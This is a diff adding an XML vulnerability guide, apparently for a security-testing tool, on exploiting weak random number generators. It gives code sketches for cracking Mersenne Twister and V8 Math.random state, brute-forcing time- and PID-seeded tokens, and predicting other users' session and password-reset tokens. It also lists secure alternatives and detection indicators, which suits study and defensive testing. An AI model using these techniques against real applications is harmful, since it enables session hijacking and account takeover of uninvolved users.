@@ -1,0 +1,268 @@
+<vulnerability_guide>
+  <title>WEAK PRNG EXPLOITATION - PREDICTABLE RANDOM NUMBER ATTACKS</title>
+
+  <critical>Weak Pseudo-Random Number Generators (PRNGs) produce predictable output that can compromise cryptographic security. When session tokens, CSRF tokens, password reset links, or cryptographic keys are generated with weak randomness, attackers can predict future values or reconstruct the internal state. This vulnerability has led to complete authentication bypass in major applications.</critical>
+
+  <scope>
+    - Session token and cookie generation
+    - CSRF token prediction
+    - Password reset link tokens
+    - API key generation
+    - Cryptographic key material
+    - Nonces and IVs for encryption
+    - Random filenames and identifiers
+  </scope>
+
+  <methodology>
+    1. **Identify random values**: Collect tokens, IDs, and other random-looking values
+    2. **Analyze patterns**: Look for sequential, time-based, or predictable patterns
+    3. **Identify PRNG**: Determine which random function is used
+    4. **Crack state**: Attempt to recover PRNG internal state from output
+    5. **Predict values**: Generate future or past values
+  </methodology>
+
+  <advanced_techniques>
+    <weak_prng_identification>
+      Identify weak random sources:
+      {% raw %}
+      # Common weak PRNGs
+      # JavaScript: Math.random() - NOT cryptographically secure
+      # PHP: rand(), mt_rand() - predictable
+      # Python: random.random() - NOT for security
+      # Java: java.util.Random - predictable
+      # C: rand(), srand() - trivially predictable
+
+      # Secure alternatives
+      # JavaScript: crypto.getRandomValues()
+      # PHP: random_bytes(), random_int()
+      # Python: secrets module, os.urandom()
+      # Java: SecureRandom
+      # C: getrandom(), /dev/urandom
+
+      # Code patterns to look for
+      Math.random()
+      rand()
+      mt_rand()
+      random.randint()
+      new Random()  # without SecureRandom
+      srand(time(NULL))  # time-seeded
+      {% endraw %}
+    </weak_prng_identification>
+
+    <pattern_analysis>
+      Detect patterns in random values:
+      {% raw %}
+      # Collect multiple samples
+      tokens = []
+      for i in range(100):
+          token = get_new_session_token()
+          tokens.append((timestamp, token))
+          time.sleep(0.1)
+
+      # Sequential analysis
+      for i in range(len(tokens) - 1):
+          diff = int(tokens[i+1][1], 16) - int(tokens[i][1], 16)
+          print(f"Diff: {diff}")  # Constant diff = linear PRNG
+
+      # Time correlation
+      for ts, token in tokens:
+          # Check if token is derived from timestamp
+          if token_matches_time(token, ts):
+              print("Time-based token detected")
+
+      # Statistical analysis
+      from collections import Counter
+      byte_freq = Counter()
+      for token in tokens:
+          for byte in bytes.fromhex(token):
+              byte_freq[byte] += 1
+      # Non-uniform distribution indicates weak PRNG
+
+      # Check for common seeds
+      common_seeds = [0, 1, int(time.time()), os.getpid()]
+      for seed in common_seeds:
+          if predict_with_seed(seed, tokens[0]):
+              print(f"Weak seed: {seed}")
+      {% endraw %}
+    </pattern_analysis>
+
+    <mersenne_twister_crack>
+      Crack PHP mt_rand() / Python random:
+      {% raw %}
+      # Mersenne Twister has 624 32-bit state values
+      # After observing 624 outputs, full state is recoverable
+
+      # Using php_mt_seed tool
+      php_mt_seed 12345678  # Finds seed that produces this output
+
+      # Python randcrack library
+      from randcrack import RandCrack
+      rc = RandCrack()
+
+      # Feed 624 consecutive outputs
+      for i in range(624):
+          value = get_random_output()
+          rc.submit(value)
+
+      # Now predict future values
+      next_value = rc.predict_getrandbits(32)
+
+      # Partial output recovery
+      # If only seeing limited bits (e.g., token is truncated)
+      # Use Z3 or other solvers to reconstruct state
+      from z3 import *
+      state = [BitVec(f's{i}', 32) for i in range(624)]
+      # Add constraints based on observed outputs
+      {% endraw %}
+    </mersenne_twister_crack>
+
+    <javascript_math_random>
+      Predict Math.random() in browsers:
+      {% raw %}
+      # V8 (Chrome) uses xorshift128+
+      # Internal state: two 64-bit values
+
+      # xorshift128+ algorithm
+      def xs128p(state0, state1):
+          s1 = state0
+          s0 = state1
+          s1 ^= (s1 << 23) & 0xFFFFFFFFFFFFFFFF
+          s1 ^= s1 >> 17
+          s1 ^= s0
+          s1 ^= s0 >> 26
+          return (state1, s1), (state0 + state1) & 0xFFFFFFFFFFFFFFFF
+
+      # With two consecutive outputs, can solve for state
+      # Then predict all future outputs
+
+      # Practical attack requires:
+      # 1. Get multiple Math.random() outputs (e.g., via XSS)
+      # 2. Use Z3 to solve for internal state
+      # 3. Predict future tokens generated client-side
+
+      # Tool: xs128p cracker
+      # Requires two consecutive double outputs
+      {% endraw %}
+    </javascript_math_random>
+
+    <time_based_prediction>
+      Exploit time-seeded PRNGs:
+      {% raw %}
+      # Common pattern: srand(time(NULL))
+      # If you know approximate time of token generation:
+
+      import time
+
+      def predict_time_seeded_token(target_token, time_window=3600):
+          current_time = int(time.time())
+
+          for seed in range(current_time - time_window, current_time + 1):
+              random.seed(seed)
+              predicted = generate_token()  # Same function as target
+              if predicted == target_token:
+                  return seed
+
+          return None
+
+      # Once seed is found, predict all tokens for that seed
+
+      # For PHP rand() seeded with time:
+      # Brute force second-level timestamps
+      for ts in range(start_time, end_time):
+          srand(ts)
+          if rand() == observed_value:
+              print(f"Seed: {ts}")
+      {% endraw %}
+    </time_based_prediction>
+
+    <token_prediction_exploitation>
+      Exploit predictable tokens:
+      {% raw %}
+      # Session hijacking via prediction
+      # 1. Analyze session token format
+      # 2. Crack PRNG state
+      # 3. Predict session tokens for other users
+
+      def hijack_session():
+          # Get your own tokens
+          my_tokens = [get_session_token() for _ in range(10)]
+
+          # Crack PRNG state
+          state = crack_prng_state(my_tokens)
+
+          # Predict tokens assigned before/after yours
+          for offset in range(-100, 100):
+              predicted = generate_with_state(state, offset)
+              if try_session(predicted):
+                  print(f"Valid session: {predicted}")
+
+      # Password reset token prediction
+      # 1. Request reset for your account
+      # 2. Note your token and timestamp
+      # 3. Request reset for target (attacker-controlled timing)
+      # 4. Predict target's token based on time difference
+
+      # CSRF token prediction
+      # If CSRF uses weak PRNG, predict token for target user's session
+      {% endraw %}
+    </token_prediction_exploitation>
+
+    <pid_based_attacks>
+      Exploit PID/time-seeded randomness:
+      {% raw %}
+      # Some apps seed with PID + time
+      # srand(getpid() ^ time(NULL))
+
+      # On shared hosting or containers:
+      # - PID range is limited
+      # - Multiple processes may share PIDs over time
+      # - Container PIDs often start at 1
+
+      # Brute force approach
+      for pid in range(1, 65536):
+          for ts in range(time_start, time_end):
+              seed = pid ^ ts
+              if predict_matches(seed, target_token):
+                  print(f"Found: PID={pid}, Time={ts}")
+
+      # Docker/container: PIDs often predictable
+      # PID 1 = init, low PIDs for app processes
+      {% endraw %}
+    </pid_based_attacks>
+  </advanced_techniques>
+
+  <validation>
+    - Identify the PRNG algorithm used
+    - Demonstrate prediction of at least one future value
+    - Show correlation between outputs (sequential, time-based)
+    - Exploit prediction for session hijacking or token forgery
+    - Document the security impact of prediction
+  </validation>
+
+  <false_positives>
+    - Cryptographically secure PRNGs (CSPRNG)
+    - Values that include additional entropy (server-side secrets)
+    - HMAC or hash-based token derivation with secret key
+    - High entropy values that resist statistical analysis
+  </false_positives>
+
+  <detection_indicators>
+    - High volume of session/token collection requests
+    - Sequential probing of token space
+    - Multiple authentication attempts with predicted values
+    - Password reset requests at precise time intervals
+  </detection_indicators>
+
+  <pro_tips>
+    - Math.random() in JavaScript is NEVER safe for security purposes
+    - PHP's mt_rand() can be cracked with ~624 outputs
+    - Time-based seeding reduces entropy to seconds in a day (~86400)
+    - Look for patterns in UUIDs - v1 uses timestamp, v4 should be random
+    - Some frameworks use weak PRNG by default - check documentation
+    - Server restart may reset PRNG state to predictable seed
+    - Token length doesn't equal security if PRNG is weak
+    - Collect tokens from different users/sessions to analyze generator
+  </pro_tips>
+
+  <remember>A weak PRNG makes all cryptographic operations built on it worthless. Session tokens, password reset links, and CSRF tokens are only secure if generated with cryptographically secure randomness.</remember>
+</vulnerability_guide>
